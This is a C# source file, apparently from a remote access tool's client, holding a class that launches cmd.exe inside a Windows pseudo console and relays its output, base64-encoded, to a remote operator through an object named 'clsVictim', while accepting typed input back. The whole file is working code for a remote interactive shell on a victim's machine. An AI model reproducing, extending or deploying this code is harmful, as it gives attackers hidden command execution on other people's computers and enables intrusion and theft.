using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Xml.Linq;

namespace winClient48
{
    public sealed class clsfnXterm : IDisposable
    {
        //ConPTY
        private IntPtr m_hPC = IntPtr.Zero;

        //Pipe
        private SafeFileHandle m_hPipeInRead;
        private SafeFileHandle m_hPipeInWrite;
        private SafeFileHandle m_hPipeOutRead;
        private SafeFileHandle m_hPipeOutWrite;

        //Process
        private IntPtr m_hProcess = IntPtr.Zero;
        private IntPtr m_hThread = IntPtr.Zero;

        //Thread
        private Thread m_readThread;
        private volatile bool m_isRunning;

        //Callback
        public Action<byte[]> actOnOutput;

        private readonly clsVictim m_victim;
        private readonly string m_szInitDir;

        public clsfnXterm(clsVictim victim, string szInitDir)
        {
            m_victim = victim;
            m_szInitDir = szInitDir;

            actOnOutput += data =>
            {
                m_victim.fnSendCommand(new[]
                {
                "xterm",
                "output",
                Convert.ToBase64String(data)
            });
            };
        }

        /// <summary>
        /// Start
        /// </summary>
        /// <param name="cols"></param>
        /// <param name="rows"></param>
        /// <exception cref="InvalidOperationException"></exception>
        public void fnStart(int cols = 80, int rows = 24)
        {
            fnStop();

            WinAPI.CreatePipe(out m_hPipeInRead, out m_hPipeInWrite, IntPtr.Zero, 0);
            WinAPI.CreatePipe(out m_hPipeOutRead, out m_hPipeOutWrite, IntPtr.Zero, 0);

            var size = new WinAPI.COORD
            {
                X = (short)cols,
                Y = (short)rows
            };

            int hr = WinAPI.CreatePseudoConsole(
                size,
                m_hPipeInRead.DangerousGetHandle(),
                m_hPipeOutWrite.DangerousGetHandle(),
                0,
                out m_hPC
            );

            if (hr != 0)
                throw new InvalidOperationException($"CreatePseudoConsole failed: 0x{hr:X}");

            fnStartProcessWithConPTY("cmd.exe /Q /K");

            m_isRunning = true;
            m_readThread = new Thread(fnReadLoop)
            {
                IsBackground = true
            };
            m_readThread.Start();
        }

        /// <summary>
        /// Stop
        /// </summary>
        public void fnStop()
        {
            m_isRunning = false;

            m_hPipeOutRead?.Dispose();
            m_hPipeInWrite?.Dispose();
            m_hPipeInRead?.Dispose();
            m_hPipeOutWrite?.Dispose();

            m_readThread?.Join(1000);

            if (m_hPC != IntPtr.Zero)
                WinAPI.ClosePseudoConsole(m_hPC);

            if (m_hProcess != IntPtr.Zero)
                WinAPI.CloseHandle(m_hProcess);

            if (m_hThread != IntPtr.Zero)
                WinAPI.CloseHandle(m_hThread);

            // reset
            m_hPC = IntPtr.Zero;
            m_hProcess = IntPtr.Zero;
            m_hThread = IntPtr.Zero;
            m_readThread = null;
        }

        public void Dispose() => fnStop();

        /// <summary>
        /// Create process.
        /// </summary>
        /// <param name="commandLine"></param>
        /// <exception cref="Win32Exception"></exception>
        private void fnStartProcessWithConPTY(string commandLine)
        {
            var siEx = new WinAPI.STARTUPINFOEX();
            siEx.StartupInfo.cb = Marshal.SizeOf(siEx);

            IntPtr attrSize = IntPtr.Zero;
            WinAPI.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attrSize);

            siEx.lpAttributeList = Marshal.AllocHGlobal(attrSize);

            try
            {
                WinAPI.InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref attrSize);

                WinAPI.UpdateProcThreadAttribute(
                    siEx.lpAttributeList,
                    0,
                    (IntPtr)WinAPI.PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
                    m_hPC,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero
                );

                bool ok = WinAPI.CreateProcessW(
                    null,
                    commandLine,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    WinAPI.EXTENDED_STARTUPINFO_PRESENT,
                    IntPtr.Zero,
                    m_szInitDir,
                    ref siEx,
                    out WinAPI.PROCESS_INFORMATION pi
                );

                if (!ok)
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                m_hProcess = pi.hProcess;
                m_hThread = pi.hThread;

                fnPushInput($"echo Welcome to Xterm Shell\r\n");
                fnPushInput("echo READY\r\n");
            }
            finally
            {
                if (siEx.lpAttributeList != IntPtr.Zero)
                {
                    WinAPI.DeleteProcThreadAttributeList(siEx.lpAttributeList);
                    Marshal.FreeHGlobal(siEx.lpAttributeList);
                }
            }
        }

        /// <summary>
        /// Read loop.
        /// </summary>
        private void fnReadLoop()
        {
            var buffer = new byte[4096];

            while (m_isRunning)
            {
                if (!WinAPI.ReadFile(
                        m_hPipeOutRead,
                        buffer,
                        buffer.Length,
                        out int read,
                        IntPtr.Zero))
                    break;

                if (read > 0)
                {
                    var data = new byte[read];
                    Buffer.BlockCopy(buffer, 0, data, 0, read);
                    actOnOutput?.Invoke(data);
                }
            }
        }

        /// <summary>
        /// Input
        /// </summary>
        /// <param name="szInput"></param>
        public void fnPushInput(string szInput) => fnPushInput(Encoding.UTF8.GetBytes(szInput));

        /// <summary>
        /// Input
        /// </summary>
        /// <param name="abData"></param>
        public void fnPushInput(byte[] abData)
        {
            if (!m_isRunning || m_hPipeInWrite == null)
                return;

            if (abData.Length == 1 && abData[0] == (byte)'\n')
                abData = Encoding.ASCII.GetBytes("\r\n");

            WinAPI.WriteFile(m_hPipeInWrite, abData, abData.Length, out _, IntPtr.Zero);
        }

        /// <summary>
        /// Resize
        /// </summary>
        /// <param name="cols"></param>
        /// <param name="rows"></param>
        public void fnResize(int cols, int rows)
        {
            if (m_hPC == IntPtr.Zero)
                return;

            var size = new WinAPI.COORD
            {
                X = (short)cols,
                Y = (short)rows
            };

            WinAPI.ResizePseudoConsole(m_hPC, size);
        }
    }
}
